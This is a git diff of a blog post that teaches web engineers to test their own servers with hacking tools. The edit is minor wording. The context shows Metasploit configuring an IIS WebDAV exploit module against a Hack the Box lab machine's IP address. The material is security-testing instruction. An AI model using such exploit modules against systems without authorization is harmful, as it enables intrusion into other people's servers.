@@ -1,5 +1,4 @@
 # Hacking tools for web engineers
-
 We, web engineers, love to use steady and up-to-date web servers, well-known authentication frameworks, and robust encryption libraries. We also issue [Let's encrypt](https://letsencrypt.org/) certificates in order to encrypt our traffic, and leverage cloud private networks with well-thought-out security policies. Not even mention the salted hashes for storing passwords, and a lot more besides, and many many more security measures. We think our applications are rock solid, as secure as they can be. But, are they?
 
 In this post I'm going to be walking you through five tools you can easily set up and run in order to test the security of your servers and web applications. Note that the examples listed below are executed against a vulnerable-on-purpose [Hack the Box](https://www.hackthebox.eu/) machine referenced by its IP address, but the URL of your site may be used instead.
@@ -265,7 +264,7 @@ Exploit target:
    0   Microsoft Windows Server 2003 R2 SP2 x86
 ```
 
-The only mandatory option that hasn't been set is __RHOSTS__, and corresponds to the target host (victim). So let's set it to the IP address of the same machine we scanned with the previous tools:
+The only mandatory option that hasn't been set is __RHOSTS__, and corresponds to the target host (victim). So let's set it to the IP address of the same machine we scanned previously:
 ```
 msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOSTS 10.10.10.14
 RHOSTS => 10.10.10.14
